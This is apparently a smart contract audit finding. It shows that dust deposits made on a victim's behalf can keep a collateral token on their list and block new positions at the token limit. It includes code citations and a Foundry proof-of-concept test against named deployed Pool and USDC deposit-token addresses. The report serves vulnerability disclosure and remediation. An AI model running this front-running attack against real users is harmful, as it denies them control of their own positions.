### Title
Unprivileged dust deposits can prevent collateral removal from an account's token list - (`contracts/DepositToken.sol`)

### Summary
`DepositToken` removes a collateral token from an account's Pool tracking set only when a burn or transfer leaves the account with a zero balance. [1](#0-0)  Because `deposit(uint256,address)` permits anyone to mint deposit tokens to an arbitrary `onBehalfOf_` account, an attacker can front-run a victim's full withdrawal with a dust deposit and keep the token registered to the victim. [2](#0-1)  This can repeatedly prevent the victim from freeing a slot under `MAX_TOKENS_PER_USER`, blocking future deposits or debt positions involving a new token. [3](#0-2) 

### Finding Description
The Pool maintains per-account deposit-token and debt-token lists whose combined length must remain below `MAX_TOKENS_PER_USER = 30`. [4](#0-3) [3](#0-2)  A deposit token is added when the recipient's balance changes from zero and removed only when a burn or outgoing transfer reaches zero. [5](#0-4) [6](#0-5) 

An attacker can observe a withdrawal or transfer intended to empty the victim's balance and front-run it with `deposit(dust, victim)`. [7](#0-6)  The victim's transaction still burns its originally specified amount, but the attacker-created residual balance prevents `removeFromDepositTokensOfAccount(victim)` from executing. [8](#0-7) 

### Impact Explanation
A victim at the token limit cannot reliably free a collateral slot while an attacker is willing to repeat the front-run. Each retry leaves another dust balance that must be withdrawn separately, and the attacker can again make the next supposedly-final withdrawal leave a positive balance. This causes a temporary liveness failure for changing collateral composition and can prevent the victim from depositing a different collateral or creating a new debt position once `UserReachedMaxTokens` is reached. [3](#0-2)  The attacker only needs an allowed underlying token and gas; the dust remains claimable by the victim, so the economic cost is primarily transaction fees rather than loss of the deposited dust.

### Likelihood Explanation
The attack requires no privileged role because `deposit` is public and accepts an arbitrary beneficiary. [7](#0-6)  Neither `onlyIfDepositTokenExists` nor `onlyIfDepositTokenIsActive` prevents deposits on behalf of another account while the collateral remains supported and active. [9](#0-8)  The attack is not fully permanent because the victim can withdraw the residual amount afterward, but monitoring and repeatedly front-running each zero-balance transaction can sustain the denial.

### Recommendation
Track token membership independently of incidental dust balances, or provide an explicit owner-authorized `removeDepositTokenFromAccount` operation that withdraws/transfers any residual balance before removing the token. Alternatively, restrict `onBehalfOf_` deposits or introduce an opt-in beneficiary mechanism. Any removal path should account for collateral value, debt health, reward accounting, and liquidation consequences.

### Proof of Concept
The following mainnet-fork test demonstrates the issue against deployed Pool 1 and its USDC deposit token:

```solidity
// test/foundry/poc/DustDepositRemovalDoS.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import {IERC20} from "contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {IDepositToken} from "contracts/interfaces/IDepositToken.sol";
import {IPool} from "contracts/interfaces/IPool.sol";

contract DustDepositRemovalDoSTest is Test {
    IPool constant POOL = IPool(0x3364f53cB866762Aef66DeEF2a6b1a17C1F17f46);
    IDepositToken constant MSD_USDC =
        IDepositToken(0x1A9551de6d56f7768398a82aA2186624a43d89e3);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testDustDepositPreventsTokenListRemoval() public {
        address alice = address(0xA11CE);
        address bob = address(0xB0B);

        deal(address(USDC), alice, 100e6);
        deal(address(USDC), bob, 1e6);

        vm.startPrank(alice);
        USDC.approve(address(MSD_USDC), type(uint256).max);
        MSD_USDC.deposit(100e6, alice);
        vm.stopPrank();

        uint256 aliceBalance = MSD_USDC.balanceOf(alice);
        assertTrue(aliceBalance > 0);

        // Bob front-runs Alice's full withdrawal with a deposit on her behalf.
        vm.startPrank(bob);
        USDC.approve(address(MSD_USDC), type(uint256).max);
        MSD_USDC.deposit(1e6, alice);
        vm.stopPrank();

        // Alice attempts to empty her balance using the previously observed amount.
        vm.prank(alice);
        MSD_USDC.withdraw(aliceBalance, alice);

        // The withdrawal succeeded, but the token remains registered to Alice.
        assertGt(MSD_USDC.balanceOf(alice), 0);
        address[] memory tokens = POOL.getDepositTokensOfAccount(alice);
        bool stillListed;
        for (uint256 i; i < tokens.length; ++i) {
            if (tokens[i] == address(MSD_USDC)) stillListed = true;
        }
        assertTrue(stillListed);
    }
}
```

Run with:

```bash
MAINNET_NODE_URL=<rpc-url> \
MAINNET_BLOCK_NUMBER=<supported-block> \
forge test --match-test testDustDepositPreventsTokenListRemoval -vvv
```

### Citations

**File:** contracts/DepositToken.sol (L104-118)
```text
    /**
     * @dev Throws if deposit token doesn't exist
     */
    modifier onlyIfDepositTokenExists() {
        if (!pool.doesDepositTokenExist(this)) revert CollateralIsInexistent();
        _;
    }

    /**
     * @dev Throws if deposit token isn't enabled
     */
    modifier onlyIfDepositTokenIsActive() {
        if (!isActive) revert DepositTokenIsInactive();
        _;
    }
```

**File:** contracts/DepositToken.sol (L211-234)
```text
    function deposit(
        uint256 amount_,
        address onBehalfOf_
    ) external override whenNotPaused nonReentrant onlyIfDepositTokenExists returns (uint256 _deposited, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();
        if (onBehalfOf_ == address(0)) revert BeneficiaryIsNull();

        IPool _pool = pool;
        IERC20 _underlying = underlying;
        address _msgSender = _msgSender();
        address _treasury = address(_pool.treasury());

        if (_msgSender == _treasury) revert TreasuryCanNotDeposit();

        uint256 _balanceBefore = _underlying.balanceOf(_treasury);
        _underlying.safeTransferFrom(_msgSender, _treasury, amount_);
        amount_ = _underlying.balanceOf(_treasury) - _balanceBefore;

        (_deposited, _fee) = quoteDepositOut(amount_);
        if (_fee > 0) {
            _mint(_pool.feeCollector(), _fee);
        }

        _mint(onBehalfOf_, _deposited);
```

**File:** contracts/DepositToken.sol (L444-462)
```text
    function _burn(address _account, uint256 _amount) private updateRewardsBeforeMintOrBurn(_account) {
        if (_account == address(0)) revert BurnFromTheZeroAddress();

        uint256 _balanceBefore = balanceOf[_account];
        if (_balanceBefore < _amount) revert BurnAmountExceedsBalance();
        uint256 _balanceAfter;
        unchecked {
            _balanceAfter = _balanceBefore - _amount;
            totalSupply -= _amount;
        }

        balanceOf[_account] = _balanceAfter;

        emit Transfer(_account, address(0), _amount);

        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (_amount > 0 && _balanceAfter == 0) {
            pool.removeFromDepositTokensOfAccount(_account);
        }
```

**File:** contracts/DepositToken.sol (L485-488)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(account_);
        }
```

**File:** contracts/DepositToken.sol (L517-525)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_recipientBalanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(recipient_);
        }

        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (amount_ > 0 && balanceOf[sender_] == 0) {
            pool.removeFromDepositTokensOfAccount(sender_);
        }
```

**File:** contracts/Pool.sol (L76-79)
```text
    /**
     * @notice Maximum tokens per pool a user may have
     */
    uint256 public constant MAX_TOKENS_PER_USER = 30;
```

**File:** contracts/Pool.sol (L143-147)
```text
    modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
        if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
            revert UserReachedMaxTokens();
        }
        _;
```
